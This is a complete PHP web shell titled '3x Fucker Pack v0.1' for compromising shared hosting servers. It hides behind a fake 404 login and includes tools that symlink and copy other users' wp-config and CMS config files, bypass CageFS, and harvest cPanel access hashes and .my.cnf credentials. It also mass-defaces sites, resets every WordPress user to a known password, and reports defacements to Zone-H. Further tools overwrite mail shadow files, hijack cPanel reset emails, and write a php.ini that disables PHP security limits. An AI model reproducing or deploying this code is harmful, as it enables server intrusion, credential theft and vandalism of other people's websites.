<?php
  error_reporting(0);
  ini_set('max_execution_time',0);
  session_start();
  $name="3x";
  function login() { // point to be noted that design, login functions are not created by 3xp1r3 Pr1nc3.. Only tools are created by 3xp1r3 Pr1nc3!
    $random_url = mt_rand(1000000, 247345736453);
    $curl = curl_init();
    $protocol = 'http://';
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') { $protocol = 'https://'; }
    curl_setopt($curl, CURLOPT_URL, $protocol . $_SERVER['HTTP_HOST'] . '/' . $random_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $server_404 = curl_exec($curl);
    $server_404 = str_replace("/{$random_url}", $_SERVER['SCRIPT_NAME'], $server_404);
    $server_404 = str_replace("{$random_url}", $_SERVER['SCRIPT_NAME'], $server_404);
    echo $server_404;
    exit;
  }
  if (!isset($_SESSION[md5($sexy)]))
    if (isset($_GET[$name]) && ($_GET[$name] == $name))
      $_SESSION[md5($sexy)] = true;
  else login();
?>
<!DOCTYPE html>
<html>
  <head>
    <title>3x Fucker Pack v0.1 By 3xp1r3 Pr1nc3</title>
    <style type='text/css'>
      body {
        text-align: center;
        background: black;
        color: lightgreen;
      }
      input {
        background-color: rgb(136, 160, 141);
        padding: 5px;
        border:3px solid green;
        border-radius: 15px;
        transition:border 1s;
      }
      input:hover {
        background-color:lightblue;
        color:black;
        border: 3px solid lightgreen;
      }
      hr {
        color:green;
        box-shadow: 1px 2px 3px,0 0 25px;
      }
      a{
        text-decoration:none;color:lightgreen;
      }
      a:hover{
        text-decoration:none;color:lightblue;
      }
      h1 {
        font-size: 45px;
        color: black;
        text-shadow: 0px 0px 2px white, 0px 0px 2px white, 0px 0px 2px white, 0px 0px 2px white, 0px 0px 2px white, 0px 0px 2px white, 0px 0px 2px white, 0px 0px 2px white, 0px 0px 2px white;
      }
    </style>
  </head>
  <body>
      <hr>
      <?php
        if($_SESSION[md5($sexy)]=="true") {
          echo "<h1>3x Fucker v0.1</h1><h4>".php_uname()."<br><font color='red'>Server IP: ".gethostbyname($_SERVER['HTTP_HOST'])."</font><br><font color='lightblue'>Current User: ".get_current_user()."</font></h4>";
        }
      ?>
      <hr>
      <form method='GET'>
        <input type='submit' name='tool' value='Symlinker' size='10' >
        <input type='submit' name='tool' value='CageFS Symlinker' size='10' >
        <input type='submit' name='tool' value='Jumper' size='10' >
        <input type='submit' name='tool' value='CageFS Jumper' size='10' >
        <input type='submit' name='tool' value='CageFS Bypasser' size='10' >
        <input type='submit' name='tool' value='Access Hash Finder' size='10' >
        <input type='submit' name='tool' value='CageFS Access Hash Finder' size='10' >
        <input type='submit' name='tool' value='Automatic CP Finder' size='10' >
        <input type='submit' name='tool' value='CageFS Automatic CP Finder' size='10' >
        <input type='submit' name='tool' value='Mass Defacer' size='10' >
        <input type='submit' name='tool' value='Wordpress Mass User Changer' size='10' >
        <input type='submit' name='tool' value='Zone-H Submitter' size='10' >
        <input type='submit' name='tool' value='Uploader' size='10' >
        <input type='submit' name='tool' value='SMTP Cracker' size='10' >
        <input type='submit' name='tool' value='Contactemail Changer' size='10' >
        <input type='submit' name='tool' value='About' size='10' >
        <input type='submit' name='tool' value='Log Out' size='10' >
        <input type='submit' name='tool' value='Suicide' size='10' >
      </form>
      <hr>
  </body>
</html>
<?php
  //functions starts here!
  function footer() { //footer function
    echo "<br /><h3><font color='orange'>Public Script By: <a href='https://facebook.com/3xp1r3.Pr1nc3'>3xp1r3 Pr1nc3</a></font></h3><h4><font color='white'>GreetZ:  </font><font color='orange'>Jokr Haxor | Saiyan Haxor | Ultimate Haxor | My first Love <3 | Amar Arohi <3</font></h4>";
  }
  function sym() { //symlinker function
    if($_POST["start"]) {
      $dir=file("/etc/passwd");
      mkdir("3x_sym",0755);
      chdir("3x_sym");
      $ht='Options Indexes FollowSymLinks
      DirectoryIndex achon666ju5t.extremecrew
      AddType txt .php
      AddHandler txt .php';
      $file=fopen(".htaccess", "w+");
      fwrite($file, $ht);
      fclose($file);
      $list=["wp-config.php","wp/wp-config.php","WP/wp-config.php","wp/beta/wp-config.php","beta/wp-config.php","press/wp-config.php","wordpress/wp-config.php","Wordpress/wp-config.php","blog/wp-config.php","config.php","news/wp-config.php","new/wp-config.php","blogs/wp-config.php","home/wp-config.php","db.php","site/wp-config.php","main/wp-config.php","test/wp-config.php","configuration.php","blog/configuration.php","joomla/configuration.php","cms/configuration.php","portal/configuration.php","news/configuration.php","home/configuration.php","www/configuration.php","site/configuration.php","sites/configuration.php","vb/includes/config.php","whm/configuration.php","central/configuration.php","whm/whmcs/configuration.php","whm/WHMCS/configuration.php","whmc/WHM/configuration.php","whmcs/configuration.php","support/configuration.php","submitticket.php","whm/configuration.php","drupal/sites/default/settings.php","drupal7/sites/default/settings.php","sites/default/settings.php"];
      //$list=["wp-config.php","wp/wp-config.php","beta/wp-config.php","wordpress/wp-config.php","Wordpress/wp-config.php","my/wp-config.php","new/wp-config.php","blog/wp-config.php","site/wp-config.php","main/wp-config.php","test/wp-config.php","configuration.php","blog/configuration.php","site/configuration.php","news/configuration.php","portal/configuration.php","cms-joomla/configuration.php","home/configuration.php","joomla/configuration.php"];
      foreach($dir as $users) {
        $user=explode(":",$users);
        foreach($list as $confurl) {
          symlink("/home/".$user[0]."/public_html/".$confurl,$user[0]."~".$confurl.".txt");
        }
      }
      echo "<font color='lightblue'><h3><a href='3x_sym' target='_blank'>Click Here</a></h3></font>";
    }
  }
  function symcage() { //symlinker function
    if($_POST["start"]) {
      $dir=file(getcwd()."/passwd.txt");
      mkdir("3x_sym",0755);
      chdir("3x_sym");
      $ht='Options Indexes FollowSymLinks
      DirectoryIndex achon666ju5t.extremecrew
      AddType txt .php
      AddHandler txt .php';
      $file=fopen(".htaccess", "w+");
      fwrite($file, $ht);
      fclose($file);
      $list=["wp-config.php","wp/wp-config.php","WP/wp-config.php","wp/beta/wp-config.php","beta/wp-config.php","press/wp-config.php","wordpress/wp-config.php","Wordpress/wp-config.php","blog/wp-config.php","config.php","news/wp-config.php","new/wp-config.php","blogs/wp-config.php","home/wp-config.php","db.php","site/wp-config.php","main/wp-config.php","test/wp-config.php","configuration.php","blog/configuration.php","joomla/configuration.php","cms/configuration.php","portal/configuration.php","news/configuration.php","home/configuration.php","www/configuration.php","site/configuration.php","sites/configuration.php","vb/includes/config.php","whm/configuration.php","central/configuration.php","whm/whmcs/configuration.php","whm/WHMCS/configuration.php","whmc/WHM/configuration.php","whmcs/configuration.php","support/configuration.php","submitticket.php","whm/configuration.php","drupal/sites/default/settings.php","drupal7/sites/default/settings.php","sites/default/settings.php"];
      //$list=["wp-config.php","wp/wp-config.php","beta/wp-config.php","wordpress/wp-config.php","Wordpress/wp-config.php","my/wp-config.php","new/wp-config.php","blog/wp-config.php","site/wp-config.php","main/wp-config.php","test/wp-config.php","configuration.php","blog/configuration.php","site/configuration.php","news/configuration.php","portal/configuration.php","cms-joomla/configuration.php","home/configuration.php","joomla/configuration.php"];
      foreach($dir as $users) {
        $user=explode(":",$users);
        foreach($list as $confurl) {
          symlink("/home/".$user[0]."/public_html/".$confurl,$user[0]."~".$confurl.".txt");
        }
      }
      echo "<font color='lightblue'><h3><a href='3x_sym' target='_blank'>Click Here</a></h3></font>";
    }
  }
  function jumper() { //jumping function
    if(isset($_POST['scan'])) {
      echo '<h4>Reading Configs</h4>';
      $list=["wp-config.php","wp/wp-config.php","WP/wp-config.php","wp/beta/wp-config.php","beta/wp-config.php","press/wp-config.php","wordpress/wp-config.php","Wordpress/wp-config.php","blog/wp-config.php","config.php","news/wp-config.php","new/wp-config.php","blogs/wp-config.php","home/wp-config.php","db.php","site/wp-config.php","main/wp-config.php","test/wp-config.php","configuration.php","blog/configuration.php","joomla/configuration.php","cms/configuration.php","portal/configuration.php","news/configuration.php","home/configuration.php","www/configuration.php","site/configuration.php","sites/configuration.php","vb/includes/config.php","whm/configuration.php","central/configuration.php","whm/whmcs/configuration.php","whm/WHMCS/configuration.php","whmc/WHM/configuration.php","whmcs/configuration.php","support/configuration.php","submitticket.php","whm/configuration.php","drupal/sites/default/settings.php","drupal7/sites/default/settings.php","sites/default/settings.php"];
      //$list=["wp-config.php","wp/wp-config.php","beta/wp-config.php","wordpress/wp-config.php","Wordpress/wp-config.php","my/wp-config.php","new/wp-config.php","blog/wp-config.php","site/wp-config.php","main/wp-config.php","test/wp-config.php","configuration.php","blog/configuration.php","site/configuration.php","news/configuration.php","portal/configuration.php","cms-joomla/configuration.php","home/configuration.php","joomla/configuration.php"];
      $jumper=file("/etc/passwd");
      if(!$jumper) {
        die('<h3><font color="red">Wrong Passwd File Or Not Readable</font></h3>');
      }
      mkdir("jumping", 0755);
      chdir("jumping");
      $ht='Options Indexes FollowSymLinks
      DirectoryIndex achon666ju5t.extremecrew
      AddType txt .php
      AddHandler txt .php';
    $count=0;
      $file=fopen(".htaccess", "w+");
      fwrite($file, $ht);
      fclose($file);
      foreach($jumper as $jumping) {
        foreach ($list as $url) {
          $jumpfinal=explode(":",$jumping);
          $dir="/home/".$jumpfinal[0]."/public_html/".$url;
          if(is_readable($dir)) {
            $get=file_get_contents("$dir");
            file_put_contents($jumpfinal[0]."~".$url.".txt",$get);
            $count=$count+1;
          }
        }
      }
      echo '<font color="white"><h3>Total Founded Configs = '.$count.'<br/><a target="_blank" href="jumping">Click Here</a></h3>';
    }
  }
  function jumpercage() { //jumping function
    if(isset($_POST['scan'])) {
      echo '<h4>Reading Configs</h4>';
      $list=["wp-config.php","wp/wp-config.php","WP/wp-config.php","wp/beta/wp-config.php","beta/wp-config.php","press/wp-config.php","wordpress/wp-config.php","Wordpress/wp-config.php","blog/wp-config.php","config.php","news/wp-config.php","new/wp-config.php","blogs/wp-config.php","home/wp-config.php","db.php","site/wp-config.php","main/wp-config.php","test/wp-config.php","configuration.php","blog/configuration.php","joomla/configuration.php","cms/configuration.php","portal/configuration.php","news/configuration.php","home/configuration.php","www/configuration.php","site/configuration.php","sites/configuration.php","vb/includes/config.php","whm/configuration.php","central/configuration.php","whm/whmcs/configuration.php","whm/WHMCS/configuration.php","whmc/WHM/configuration.php","whmcs/configuration.php","support/configuration.php","submitticket.php","whm/configuration.php","drupal/sites/default/settings.php","drupal7/sites/default/settings.php","sites/default/settings.php"];
      //$list=["wp-config.php","wp/wp-config.php","beta/wp-config.php","wordpress/wp-config.php","Wordpress/wp-config.php","my/wp-config.php","new/wp-config.php","blog/wp-config.php","site/wp-config.php","main/wp-config.php","test/wp-config.php","configuration.php","blog/configuration.php","site/configuration.php","news/configuration.php","portal/configuration.php","cms-joomla/configuration.php","home/configuration.php","joomla/configuration.php"];
      $jumper=file(getcwd()."/passwd.txt");
      if(!$jumper) {
        die('<h3><font color="red">Wrong Passwd File Or Not Readable</font></h3>');
      }
      mkdir("jumping", 0755);
      chdir("jumping");
      $ht='Options Indexes FollowSymLinks
      DirectoryIndex achon666ju5t.extremecrew
      AddType txt .php
      AddHandler txt .php';
    $count=0;
      $file=fopen(".htaccess", "w+");
      fwrite($file, $ht);
      fclose($file);
      foreach($jumper as $jumping) {
        foreach ($list as $url) {
          $jumpfinal=explode(":",$jumping);
          $dir="/home/".$jumpfinal[0]."/public_html/".$url;
          if(is_readable($dir)) {
            $get=file_get_contents("$dir");
            file_put_contents($jumpfinal[0]."~".$url.".txt",$get);
            $count=$count+1;
          }
        }
      }
      echo '<font color="white"><h3>Total Founded Configs = '.$count.'<br/><a target="_blank" href="jumping">Click Here</a></h3>';
    }
  }
  function cagefs() { //cagefs bypasser function
    if ($_POST["scan"] ) {
      for($userid=0;$userid<100000;$userid++){
        $array=posix_getpwuid($userid);
        if(!empty($array)) {
          $file=fopen("passwd.txt","a");
          fwrite($file,$array[name].":\n");
          fclose($file);
        }
      }
      echo "<font color='lightblue'><h3><a href='passwd.txt' target='_blank'>Click Here</a></h3></font>";
    }
  }
  function hashes() { //accesshash finder function
    if($_POST["start"]) {
      $names=file("/etc/passwd");
      mkdir("3x_hashes",0755);
      chdir("3x_hashes");
      $count=0;
      if(isset($names)) {
        foreach($names as $name) {
          $user=explode(":",$name);
          $user=$user[0];
          $folder="/home/".$user."/.accesshash";
          if(is_readable($folder)) {
            $count=$count+1;
            $get=str_replace("\n","",file_get_contents($folder));
            $name=$user."~accesshash.txt";
            $file=fopen($name,"w");
            fwrite($file,"WHM ".$user.":".$get);
            fclose($file);
            echo '<h4><font color="lightblue">Found: </font><a href="3x_hashes/'.$user.'~accesshash.txt" target="_blank">'.$user."~accesshash".'</a></h4>';
          }
        }
        if($count==0) {
        echo "<h3><font color='red'>No accesshash is readable!</font></h3>";
        }
      } else {
        echo "<h3><font color='red'>Passwd file not found or not readable!</font></h3>";
      }
    }
  }
  function hashescage() { //accesshash finder function
    if($_POST["start"]) {
      $names=file(getcwd()."/passwd.txt");
      mkdir("3x_hashes",0755);
      chdir("3x_hashes");
      $count=0;
      if(isset($names)) {
        foreach($names as $name) {
          $user=explode(":",$name);
          $user=$user[0];
          $folder="/home/".$user."/.accesshash";
          if(is_readable($folder)) {
            $count=$count+1;
            $get=str_replace("\n","",file_get_contents($folder));
            $name=$user."~accesshash.txt";
            $file=fopen($name,"w");
            fwrite($file,"WHM ".$user.":".$get);
            fclose($file);
            echo '<h4><font color="lightblue">Found: </font><a href="3x_hashes/'.$user.'~accesshash.txt" target="_blank">'.$user."~accesshash".'</a></h4>';
          }
        }
        if($count==0) {
        echo "<h3><font color='red'>No accesshash is readable!</font></h3>";
        }
      } else {
        echo "<h3><font color='red'>Passwd file not found or not readable!</font></h3>";
      }
    }
  }
  function cp() { //accesshash finder function
    if($_POST["start"]) {
      $names=file("/etc/passwd");
      mkdir("3x_cps",0755);
      chdir("3x_cps");
      $count=0;
      if(isset($names)) {
        foreach($names as $name) {
          $user=explode(":",$name);
          $user=$user[0];
          $folder="/home/".$user."/.my.cnf";
          if(is_readable($folder)) {
            $count=$count+1;
            $get=file_get_contents($folder);
            $name=$user."~cpanel.txt";
            $file=fopen($name,"w");
            fwrite($file,$get);
            fclose($file);
            echo '<h4><font color="lightblue">Found: </font><a href="3x_cps/'.$user.'~cpanel.txt" target="_blank">'.$user."~cpanel".'</a></h4>';
          }
        }
        if($count==0) {
        echo "<h3><font color='red'>No .my.cnf is readable!</font></h3>";
        }
      } else {
        echo "<h3><font color='red'>Passwd file not found or not readable!</font></h3>";
      }
    }
  }
  function cpcage() { //accesshash finder function
    if($_POST["start"]) {
      $names=file(getcwd()."/passwd.txt");
      mkdir("3x_cps",0755);
      chdir("3x_cps");
      $count=0;
      if(isset($names)) {
        foreach($names as $name) {
          $user=explode(":",$name);
          $user=$user[0];
          $folder="/home/".$user."/.my.cnf";
          if(is_readable($folder)) {
            $count=$count+1;
            $get=file_get_contents($folder);
            $name=$user."~cpanel.txt";
            $file=fopen($name,"w");
            fwrite($file,$get);
            fclose($file);
            echo '<h4><font color="lightblue">Found: </font><a href="3x_cps/'.$user.'~cpanel.txt" target="_blank">'.$user."~cpanel".'</a></h4>';
          }
        }
        if($count==0) {
        echo "<h3><font color='red'>No .my.cnf is readable!</font></h3>";
        }
      } else {
        echo "<h3><font color='red'>Passwd file not found or not readable!</font></h3>";
      }
    }
  }
  function mass() { //mass defacer function
    if($_POST["start"]) {
      chdir($_POST["dir"]);
      $dir=scandir($_POST["dir"]);
      foreach($dir as $dirs) {
        if($dirs!=".." && $dirs!="." && filetype($dirs)=="dir") {
          $write=$_POST["dir"].$dirs."/".$_POST["filename"];
          file_put_contents ($write,$_POST['content']);
          echo "<font color='green'>".$write." ==> Defaced"."</font><br />";
        }
      }
    }
  }
  function wpmass() { //the one and only function which is not supper dupper modded by 3xp1r3 Pr1nc3 and made it able to work on any server but not 100% created by 3xp1r3 Pr1nc3 :(
    if($_POST['change']){
      $url=$_POST["config"];
      $url=$url."/";
      $curl = curl_init();
      curl_setopt($curl, CURLOPT_URL, $url);
      curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
      $get2 = curl_exec($curl);
    	preg_match_all('#<a href="(.*?)"#', $get2, $config);
    	foreach($config[1] as $don){
        chdir($_POST["path"]);
    		$openht=fopen(".htaccess","w+");
        fwrite($openht,"Options Indexes FollowSymLinks
        DirectoryIndex achon666ju5t.extremecrew
        AddType txt .php
        AddHandler txt .php
        ReadmeName ".$don);
        fclose($openht);
        $cur = curl_init();
        curl_setopt($cur, CURLOPT_URL, $url);
        curl_setopt($cur, CURLOPT_RETURNTRANSFER, true);
        $get = curl_exec($cur);
        preg_match_all("#'DB_HOST', '(.*?)'#", $get, $host);
        foreach($host[1] as $don){
        	$host = $don;
        }
        ###
        preg_match_all("#'DB_PASSWORD', '(.*?)'#", $get, $pass);
        foreach($pass[1] as $done){
        	$password = $done;
        }
        ###
        preg_match_all("#'DB_USER', '(.*?)'#", $get, $user);
        foreach($user[1] as $done1){
        	$user = $done1;
        }
        ###
        preg_match_all("#'DB_NAME', '(.*?)'#", $get, $name);
        foreach($name[1] as $done2){
        	$name = $done2;
        }
        ###
        preg_match_all("#$table_prefix  = '(.*?)'#", $get, $prefix);
        foreach($prefix[1] as $done3){
        	$prefix = $done3;
        }
        $connect = mysqli_connect($host,$user,$password,$name);
        if($connect){
        	$query1 = mysqli_query($connect,"select * from ".$prefix."options where option_name='siteurl'");
        while($siteurl = mysqli_fetch_array($query1)){
        	$site_url = $siteurl['option_value'];
        }
        #####
        $query2 = mysqli_query($connect,"update ".$prefix."users set user_login='Admin',user_pass='e48e13207341b6bffb7fb1622282247b'");
        if($query2){
        	echo "<br /><center><span class='menu'>URL : <a href='$site_url/wp-login.php' target='_blank'>$site_url/wp-login.php</a><br><br>UserName : Admin<br><br>Password : 1337<br><br></span></center>";
        }
    	 }
     }
    }
  }
  function zoneh() { //zone-h submitter function
    if($_POST["go"]) {
      $notifier=$_POST["notifier"];
      $domains=explode("\n",$_POST["domains"]);
      foreach($domains as $domain) {
        $domain=trim($domain);
        $crl=curl_init();
        curl_setopt($crl,CURLOPT_URL,$domain);
        curl_setopt($crl,CURLOPT_RETURNTRANSFER, TRUE);
        $result=curl_exec($crl);
        if(preg_match("/Hacked/",$result) OR preg_match("/hacked/",$result)) {
          $curl=curl_init();
          curl_setopt($curl,CURLOPT_URL,"http://www.zone-h.com/notify/single");
          curl_setopt($curl,CURLOPT_POST,TRUE);
          curl_setopt($curl,CURLOPT_POSTFIELDS,"defacer=$notifier&domain1=$domain&hackmode=1&reason=1");
          curl_setopt($curl,CURLOPT_RETURNTRANSFER,TRUE);
          $rezult=curl_exec($curl);
          if(preg_match("/OK/",$rezult)) {
            echo "<h4><font color='green'>".$domain." ==> Defaced & Zone-H OK</font></h4><br />";
          } else {
            echo "<h4><font color='red'>".$domain." ==> Defaced But Zone-H Error</font></h4><br />";
          }
        } else {
          echo "<h4><font color='red'>".$domain." ==> Not Defaced</font></h4><br />";
        }
      }
    }
  }
  function uploader() { //uploader function
    echo '<form action="" method="post" enctype="multipart/form-data">
     <input class="menu" type="file" name="up"/>
     <input class="menu" type="submit" name="submit" value="Submit" />
     </form>';
    if($_POST["submit"]) {
        move_uploaded_file($_FILES["up"]["tmp_name"],$_FILES["up"]["name"]);
        $url=$_FILES["up"]["name"];
        echo "<h2><a target='_blank' href='$url'>Open Shell!</a></h2>";
    }
  }
  function smtp() { //smtp cracker function
    if($_POST["crack"]) {
      $usr=get_current_user();
      $pass="root@localhost";
      $pwd=crypt($pass,'$6$roottn$');
      $maindir="/home/".$usr."/etc/";
      chdir($maindir);
      $dir=scandir($maindir);
      foreach($dir as $dirs) {
        if($dirs!="." && $dirs!="..") {
          chdir($dirs);
          if(is_readable(shadow)) {
            link("shadow","shadow.bak3x");
            $get=file_get_contents("shadow");
            $email=explode(":",$get);
            $mailname=$email[0];
            unlink("shadow");
            $file=fopen("shadow","a");
            fwrite($file,$mailname.":".$pwd.":16249:::::"."\r\n");
            fclose($file);
            echo "<br />".$dirs."|25|".$mailname."@".$dirs."|".$pass."<br />";
            chdir("..");
          }
        }
      }
    }
  }
  function about() { //about function
    echo "
      <h3><font color='lightgreen'>Script Author: </font><font color='red'> The One & Only 3xp1r3 Pr1nc3!</font></h3>
      <h3><font color='lightgreen'>Dedicated To: </font><font color='deeppink'> Amar Arohi <3</font></h3>
      <h3><font color='lightgreen'>Script Publish Date: </font><font color='lightblue'>25/11/2018</font></h3>
      <h3><font color='lightblue'>For using guide visit: </font><a href='https://github.com/3xPr1nc3/3x-fucker-v0.1/blob/master/README.md' target='_blank'>>>Click Here!<<</a></h3>
    ";
  }
  function cpcng() { // cp reseter maker
    $curl = curl_init();
    $protocol = 'http://';
    $port=':2082';
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') { $protocol = 'https://'; $port=':2083'; }
    $mainurl=$protocol.$_SERVER['HTTP_HOST'].$port;
    curl_setopt($curl, CURLOPT_URL, $mainurl);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $server_404 = curl_exec($curl);
    $server_404 = str_replace("{$port}", $_SERVER['SCRIPT_NAME'], $server_404);
    if(preg_match("/Reset Password/",$server_404)) {
      echo '<form method="post">
        <input type="text" name="mail" />
        <br />
        <input type="submit" name="go" value="GO" />
      </form>';
      if($_POST['go']) {
        $user=get_current_user();
        $path="/home/".$user."/";
        if($path) {
          chdir($path.".cpanel");
          unlink("contactinfo");
          chdir("..");
          unlink(".contactemail");
          $open=fopen(".contactemail","a");
          fwrite($open,$_POST['mail']);
          fclose($open);
          echo "<br /><a href='".$mainurl."/resetpass' target='_blank'>Click Here!</a>";
        }
      }
    } else {
      echo '<font color="red">Cp Is Not Resetable!</font>';
    }
  }

  //functions ends here!

  if(!isset($_GET["tool"])) {  $phpini="c2FmZV9tb2RlID0gT0ZGDQpTYWZlX21vZGVfZ2lkID0gT0ZGDQpkaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkUNCmRpc2FibGVfY2xhc3NlcyA9IE5PTkUNCm9wZW5fYmFzZWRpciA9IE9GRg0Kc3Vob3Npbi5leGVjdXRvci5mdW5jLmJsYWNrbGlzdCA9IE5PTkU=";
    $file=fopen("php.ini","w");
    $write=fwrite($file, base64_decode($phpini));
    fclose($file);
    footer();
  }
  if($_GET["tool"]=="Symlinker") {
    echo '<form method="POST"><input type="submit" name="start" value="Start Symlinking" /></form>';
    sym();
    footer();
  }
  if($_GET["tool"]=="CageFS Symlinker") {
    echo '<form method="POST"><input type="submit" name="start" value="Start Symlinking" /></form>';
    symcage();
    footer();
  }
  if($_GET["tool"]=="Jumper") {
    echo '<form method="POST"><input type="submit" name="scan" value="Scan" /></form>';
    jumper();
    footer();
  }
  if($_GET["tool"]=="CageFS Jumper") {
    echo '<form method="POST"><input type="submit" name="scan" value="Scan" /></form>';
    jumpercage();
    footer();
  }
  if($_GET["tool"]=="CageFS Bypasser") {
    echo '<form method="POST"><input type="submit" name="scan" value="Scan" /></form>';
    cagefs();
    footer();
  }
  if($_GET["tool"]=="Access Hash Finder") {
    echo '<form method="POST"><input type="submit" name="start" value="Scan" /></form>';
    hashes();
    footer();
  }
  if($_GET["tool"]=="CageFS Access Hash Finder") {
    echo '<form method="POST"><input type="submit" name="start" value="Scan" /></form>';
    hashescage();
    footer();
  }
  if($_GET["tool"]=="Automatic CP Finder") {
    echo '<form method="POST"><input type="submit" name="start" value="Scan" /></form>';
    cp();
    footer();
  }
  if($_GET["tool"]=="CageFS Automatic CP Finder") {
    echo '<form method="POST"><input type="submit" name="start" value="Scan" /></form>';
    cpcage();
    footer();
  }
  if($_GET["tool"]=="Mass Defacer") {
    echo "<form method='POST'>
      <textarea cols='50' rows='17' placeholder='Hacked By 3xp1r3 Pr1nc3' name='content'></textarea>
      <br>
      <h4><font color='lightgreen'>Dir To Deface: </font></h4>
      <input type='text' style='width: 250px' value='".getcwd()."/' name='dir'/>
      <h4><font color='lightgreen'>Deface Page Name: </font></h4>
      <input type='text' name='filename' value='def.php'/>
      <br>
      <input type='submit' name='start' value='start'/>
    </form>";
    mass();
    footer();
  }
  if($_GET["tool"]=="Wordpress Mass User Changer") {
    echo '<form method="post">
    <h3><font color="red">All configs link</font></h3>
    <input type="text" name="config" placeholder="http://site.com/config/">
    <br>
    <h3><font color="red">All Configs Path</font></h3>
    <input type="text" name="path" value="'.getcwd().'" />
    <br />
    <input type="submit" name="change" value="Mass Change Admin">
    </form>';
    wpmass();
    footer();
  }
  if($_GET["tool"]=="Zone-H Submitter") {
    echo '
    <form method="POST">
    <input type="text" name="notifier" value="3xp1r3 Pr1nc3" />
    <br />
    <textarea cols="50" rows="17" placeholder="Your Defaced Sites List" name="domains"></textarea>
    <br />
    <input type="submit" name="go" value="Submit"/>
    </form>
    ';
    zoneh();
    footer();
  }
  if($_GET["tool"]=="Uploader") {
    uploader();
    footer();
  }
  if($_GET["tool"]=="SMTP Cracker") {
    echo '
    <form method="POST">
      <input type="submit" name="crack" value="Crack" />
    </form>
    ';
    smtp();
    footer();
  }
  if($_GET["tool"]=="Contactemail Changer") {
    cpcng();
    footer();
  }
  if($_GET["tool"]=="About") {
    about();
    footer();
  }
  if($_GET["tool"]=="Log Out") {
    session_destroy();
    echo '<meta http-equiv="refresh" content="0"/>';
    footer();
  }
  if($_GET["tool"]=="Suicide") {
    if(unlink(basename($_SERVER['PHP_SELF']))) {
      echo '<meta http-equiv="refresh" content="0"/>';
    }
  }
?>
